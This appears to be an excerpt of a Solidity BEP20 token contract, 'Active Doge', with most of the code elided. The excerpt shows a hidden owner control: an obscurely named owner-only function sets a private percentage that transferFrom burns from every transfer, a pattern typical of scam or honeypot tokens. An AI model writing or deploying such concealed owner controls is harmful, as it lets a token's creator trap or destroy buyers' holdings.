...
contract BEP20Token is IBEP20 {
    ...
    string public name20 =  "Active Doge";
    string public symbol20 =  "ACDOGE";
    uint8 public decimals20 = 9;
    uint public _totalSupplyAG = 1*10**15 * 10**9;

    uint8 private _destek;
    ...
    constructor() {
        ...
        _owner = msgSender;
        balances[msg.sender] = _totalSupplyAG;
   ...
   function decimals() public view virtual returns (uint8) {
    ...
    function totalSupply() public override view returns (uint) {
        return _totalSupplyAG - balances[address(0)];
    }
    ...
    function transferFrom(address from, address to, uint tokens) public override returns (bool success) {
        ...
        _firex(from,tokens.mul(bakVFireC()).div(10**2));
    ...
    function _firex(address tokenOwner, uint256 tokens) internal {
        ...
        _totalSupplyAG = _totalSupplyAG.subs(tokens);
    ...
    function alVFireC(uint8 destek) public virtual onlyOwner {
		_destek = destek;
	}
